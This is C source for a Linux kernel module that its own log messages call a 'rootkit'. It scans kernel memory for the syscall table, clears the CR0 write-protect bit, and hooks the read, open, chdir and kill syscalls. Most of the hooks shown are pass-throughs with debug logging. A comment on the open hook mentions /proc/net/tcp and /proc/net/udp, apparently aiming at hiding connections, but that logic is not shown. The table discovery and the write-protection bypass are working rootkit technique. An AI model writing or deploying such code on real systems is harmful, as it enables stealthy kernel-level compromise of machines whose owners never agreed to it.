#include "RTmain.h"
#include "RTsyscalltable.h"

static void disable_write_protection(void);
static void enable_write_protection(void);
static unsigned long **sys_call_table;

// sys_read - 3
RT_SYSCALL_DEFINE(long, read, unsigned int fd,
        char __user *buf, size_t count) {
    int ret;

#ifdef DEBUG  
    printk("read:fs:[%d],count:[%d]\n",fd,count);
#endif
    
    ret = RT_SYSCALL_CALL(read, fd, buf, count);
    return ret;
}

/**
 * sys_open - 5
 * 只检查打开的文件是否是 /proc/net/tcp 或 /proc/net/udp，否则调用正常中断
 */
RT_SYSCALL_DEFINE(long, open, const char __user *filename,
        int flags, int mode) {
    int ret;

#ifdef DEBUG    
    char kfileName[MAX_PATH];
    memset(kfileName, 0, MAX_PATH);
    if (!copy_from_user(kfileName, filename, strnlen_user(filename, MAX_PATH))) {
        printk("open:filename:[%s]flags:[%d]mode:[%d]\n", kfileName, flags, mode);
    } else {
        printk("open:copy_from_user failure~~\n");
    }
#endif       

    ret = RT_SYSCALL_CALL(open, filename, flags, mode);
    return ret;
}

// sys_chdir - 12
RT_SYSCALL_DEFINE(long, chdir, const char __user *filename) {
    int ret;

#ifdef DEBUG    
    char kfileName[MAX_PATH];
    memset(kfileName, 0, MAX_PATH);
    if (!copy_from_user(kfileName, filename, strnlen_user(filename, MAX_PATH))) {
        printk("chdir:filename:[%s]\n", kfileName);
    } else {
        printk("chdir:copy_from_user failure~~\n");
    }
#endif   

    ret = RT_SYSCALL_CALL(chdir, filename);
    return ret;
}
// sys_kill - 37
RT_SYSCALL_DEFINE(long, kill, int pid, int sig) {
    long ret = 0;

#ifdef DEBUG  
    printk("kill:pid:[%d],sig:[%d]\n",pid,sig);
#endif
    
    ret = RT_SYSCALL_CALL(kill, pid, sig);
    return ret;
}



RT_SYSCALL_DEFINE(long, init_module, void __user *umod, unsigned long len,
        const char __user *uargs) {
    int ret;
    ret = RT_SYSCALL_CALL(init_module, umod, len, uargs);
    return ret;
}

// sys_getdents

RT_SYSCALL_DEFINE(long, getdents, unsigned int fd,
        struct linux_dirent __user* dirp, unsigned int count) {
    int ret;
    ret = RT_SYSCALL_CALL(getdents, fd, dirp, count);
    return ret;
}

// sys_getdents64

RT_SYSCALL_DEFINE(long, getdents64, unsigned int fd,
        struct linux_dirent64 __user* dirp, unsigned int count) {
    int ret;
    ret = RT_SYSCALL_CALL(getdents64, fd, dirp, count);
    return ret;
}


/**
 * sys_getpgid - 20号
 * 取得目前 process 的 thread ID (process ID)
 * 
 */
RT_SYSCALL_DEFINE(long, getpgid, pid_t pid) {
    long ret;
    ret = RT_SYSCALL_CALL(getpgid, pid);
    return ret;
}

RT_SYSCALL_DEFINE(long, getsid, pid_t pid) {
    int ret;
    ret = RT_SYSCALL_CALL(getsid, pid);
    return ret;
}

RT_SYSCALL_DEFINE(long, sched_getscheduler, pid_t pid) {
    int ret;
    ret = RT_SYSCALL_CALL(sched_getscheduler, pid);
    return ret;
}

RT_SYSCALL_DEFINE(long, sched_getparam, pid_t pid,
        struct sched_param __user *param) {
    int ret;
    ret = RT_SYSCALL_CALL(sched_getparam, pid, param);
    return ret;
}

RT_SYSCALL_DEFINE(long, sched_getaffinity, pid_t pid, unsigned int len,
        unsigned long __user *user_mask_ptr) {
    int ret;
    ret = RT_SYSCALL_CALL(sched_getaffinity, pid, len, user_mask_ptr);
    return ret;
}

RT_SYSCALL_DEFINE(long, sched_rr_get_interval, pid_t pid,
        struct timespec __user *interval) {
    int ret;
    ret = RT_SYSCALL_CALL(sched_rr_get_interval, pid, interval);
    return ret;
}

RT_SYSCALL_DEFINE(long, sysinfo, struct sysinfo __user *info) {
    int ret;
    ret = RT_SYSCALL_CALL(sysinfo, info);
    return ret;
}


#if BITS_PER_LONG == 32

RT_SYSCALL_DEFINE(long, stat64, char __user *filename,
        struct stat64 __user *statbuf) {
    int ret;
    ret = RT_SYSCALL_CALL(stat64, filename, statbuf);
    return ret;
}

RT_SYSCALL_DEFINE(long, fstat64, unsigned long fd, struct stat64 __user *statbuf) {
    int ret;
    ret = RT_SYSCALL_CALL(fstat64, fd, statbuf);
    return ret;
}

RT_SYSCALL_DEFINE(long, lstat64, char __user *filename,
        struct stat64 __user *statbuf) {
    long ret;
    ret = RT_SYSCALL_CALL(lstat64, filename, statbuf);
    return ret;
}

#endif

RT_SYSCALL_DEFINE(long, socketcall, int call, unsigned long __user * args) {
    int ret;
    ret = RT_SYSCALL_CALL(socketcall, call, args);
    return ret;
}

RT_SYSCALL_DEFINE(long, gettid, void) {
    int ret;
    ret = RT_SYSCALL_CALL(gettid);
    return ret;
}

// sys_getpriority

RT_SYSCALL_DEFINE(long, getpriority, int which, int who) {
    int ret;
    ret = RT_SYSCALL_CALL(getpriority, which, who);

    return ret;
}

RT_SYSCALL_DEFINE(int, waitpid, pid_t pid, int __user *stat_addr, int options) {
    int ret;

    ret = RT_SYSCALL_CALL(waitpid, pid, stat_addr, options);

    return ret;
}



static unsigned long **find_sys_call_table(void) {
    unsigned long vaddr_number;

    unsigned long **p;

    for (vaddr_number = (unsigned long) sys_close;
            vaddr_number < (unsigned long) &loops_per_jiffy;
            vaddr_number += sizeof (void *)) {
        p = (unsigned long **) vaddr_number;
        if (p[__NR_close] == (unsigned long *) sys_close)
            return p;
    }

    return NULL;
}

static void disable_write_protection(void) {
    unsigned long cr0 = read_cr0();
    clear_bit(16, &cr0);
    write_cr0(cr0);
    DLog("disable_write_protection");
}

static void enable_write_protection(void) {
    unsigned long cr0 = read_cr0();
    set_bit(16, &cr0);
    write_cr0(cr0);
    DLog("enable_write_protection");
}

static int __init
ThisInit(void) {
    DLog("rootkit init");

    sys_call_table = find_sys_call_table();
    if (NULL != sys_call_table) {
        DLog("get sys_call_table success![0x%x]", (unsigned int) sys_call_table);
    } else {
        DLog("get sys_call_table failure!");
        return -1;
    }

    disable_write_protection();
    
    RT_SYSCALL_REPLACE(read); //3
    RT_SYSCALL_REPLACE(open); //5    
    RT_SYSCALL_REPLACE(chdir); //12
    RT_SYSCALL_REPLACE(kill); //37

    enable_write_protection();

    return 0;
}

static void __exit
ThisExit(void) {

    disable_write_protection();

    RT_SYSCALL_RESTORE(read); //3
    RT_SYSCALL_RESTORE(open); //5   
    RT_SYSCALL_RESTORE(chdir); //12
    RT_SYSCALL_RESTORE(kill); //37

    enable_write_protection();

    DLog("rootkit exit");
}

module_init(ThisInit); //模块入口函数
module_exit(ThisExit); //模块出口函数
MODULE_LICENSE("GPL");
MODULE_AUTHOR("youyifeng");
MODULE_DESCRIPTION("This module can hook the sys_* function.");
